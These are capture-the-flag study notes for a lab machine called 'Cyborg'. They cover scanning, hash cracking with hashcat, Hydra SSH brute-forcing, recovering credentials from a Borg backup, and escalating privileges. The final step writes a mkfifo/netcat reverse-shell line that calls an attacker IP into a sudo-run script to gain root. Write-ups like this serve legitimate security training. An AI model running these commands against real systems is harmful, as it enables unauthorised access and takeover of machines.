# Cyborg

> Converted from cybersecurity DOCX notes into a structured markdown outline and study reference.

## STEP 1: BASIC Nmap

- "map -Pn -A -sV 10.10.99.33"

- PORT STATE SERVICE VERSION

- 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)

- | ssh-hostkey:

- | 2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)

- | 256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)

- |_ 256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)

- 80/tcp open http Apache httpd 2.4.18 ((Ubuntu))

- |_http-server-header: Apache/2.4.18 (Ubuntu)

- |_http-title: Apache2 Ubuntu Default Page: It works

- Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

## Step 2: Visit Webpage

- Apache 2 default page

- no robots.txt

- no signs of customization or admin panel.

- viewing the source reveals nothing

## Step 3: Directory Enumeration

- "dirb http://10.10.99.33:80 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -w"

- admin directory reveals msuic achievements

- etc directory revealed

## Step 4: Metsploit Cve-2018-15473

- Username Enumeration

- tests for false positives and finds false postiives

- auto-terminatesear

## STEP 5: DEEPER Nmap

- "Nmap -Pn -A -oN vulns.txt 10.10.99.33 --script vuln"

## Step 6: Visit Admin Directory

- site owner name is "Alex"

- Alex is from the United Kingdom

- there is a seemingly random string: "my-studio"

- viewing code reveals a zip file"./archive.tar"

- the Admins link indicates there is a "squid proxy"

- the Admins link indicates something called: "music_archive"

- The Archive link made for a download of the archive.tar

- possible usernames: josh, alex, adam

## Step 7: Visit The Etc Directory

- passed file contains: "

- music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn."

- looking on pentestmonkey.net indicates this is both a username and the encrypted password

- hashes.com used to conduct an analysis of the hash

- possible hash types: "Apache $apr1$ MD5, md5apr1, MD5 (APR)"

- hashes.com could not decrypt the hash

- squid.conf file contains: "

- auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
-auth_param basic children 5
-auth_param basic realm Squid Basic Authentication
-auth_param basic credentialsttl 2 hours
-acl auth_users proxy_auth REQUIRED
-http_access allow auth_users"

## Step 8: Expand Archive.tar

- no password required

- found a nonce: "00000000200000b9"

- there is a "config" file with an ID and a key

- most of this is likely related to the BorgBackup and will not really help

- more to follow on this one

## Step 9: Decrypt

- music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn."

- put the hash into a file: "hashes.txt"

- Command: 'hashcat -m 1600 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

- success: squidward

## Step 10: Hydra SSH

- put music-archive, josh, alex, adam, my-studio into a file "usernames"

- put "squidward" into file: passwords

- command: hydra -L usernames -P passwords 10.10.99.33 ssh -v

- results:

- [INFO] Successful, password authentication is supported by ssh://10.10.99.33:22

- 1 of 1 target completed, 0 valid password found

- command: hydra -L usernames -P /usr/share/wordlists/rockyou.txt 10.10.99.33 ssh -v -t 8

## Step 11: More Archive.tar

- nothing is working at this point

- review the website found in the README file

- the files in the archive are actual data files. Moreover, they are encrypted, deduplicated, and compressed. This means a need to install the borg software onto my own machine

## Step 12: Employ Borg

- command: "sudo apt install borg"

- the archive was downloaded into the Downloads folder and expanded to it's own subtree

- command to list the tree: borg list home/field/dev/finale_archive/

- requested the passphrase which turned out to be: squidward

- creates a file called "lock.roster"

- the "music_archive" backup was listed

- mkdir /mnt/borgmnt

- mount the archive: sudo borg mount home/field/dev/final_archive /mnt/borgmnt

- didn't really work or I couldn't figure it out.

- moved deeper into the extracted archve

- extracted the archive: "borg extract final_archive::music_archive" and the squidward passwork

- autocreated a new folder named for the user "alex"

- the Desktop folder contains "secret.txt" but nothing useful in it… just a note to people with persistence

- Desktop folder contains note.txt: alex:S3cretP@s3

- log into ssh: ssh alex@10.10.99.33

- user flag in the home directory

## Step 13: Run Linpease

- created a python server (python3 -m http.server) on my device

- used wget to transfer linpeas.sh onto the target machine

- used chmod to add the "x"

- so much information, quite a few potentially useful things.

- current user, "alex", can run /etc/mp3backups/backup.sh as sudo

- tried to run the script but gave an error:

- the script ran

- problem: the file permissions indicate that alex and execute and read, but cannot write

- solution: alex is the file's owner so add: "chmod +w backup.sh"

## Step 14: Exploit Backup.sh

- change the contents of the file to:

- 'mkfifo /tmp/lol;nc your-attacker-IP 4444 </tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol'

- start netcat listener on port 4444 from attacking device

- the use of sudo transfers the "root" privileges to the new shell
